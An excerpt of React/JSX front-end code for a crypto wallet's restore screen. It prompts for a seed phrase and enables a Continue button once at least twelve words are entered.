            ...
            <div className="bg-slate-50 dark:bg-gray-950 flex flex-col min-h-screen h-screen">
                <div className="flex-grow py-8 space-y-3">
                    <div className="px-4">
                        <div 
                            onClick={() => router.back()} 
                            className="w-8 h-8 cursor-pointer text-xl flex items-center justify-center text-blue-500"
                        >
                            <LiaAngleLeftSolid />
                        </div>
                    </div>
                    <div className="h-full px-4 space-y-10">
                        <div className="text-center">
                            ...
                            <div className="text-gray-400 text-sm">
                                Enter your Recover Phrase (Seed Phrase) to restore your wallet.
                            </div>
                        </div>
                ...
                <div className="space-y-3 p-4">
                    <div
                        onClick={() => {
                            !formdata.proccessing && phrase.split(" ").length > 11 && formdata.submit()
                        }}
                        className={`${!formdata.proccessing && phrase.split(" ").length < 12 && "bg-opacity-30"} bg-blue-600 rounded-full text-center cursor-pointer py-4 px-9 text-white font-bold`}
                    >
                        Continue
                    </div>
                </div>
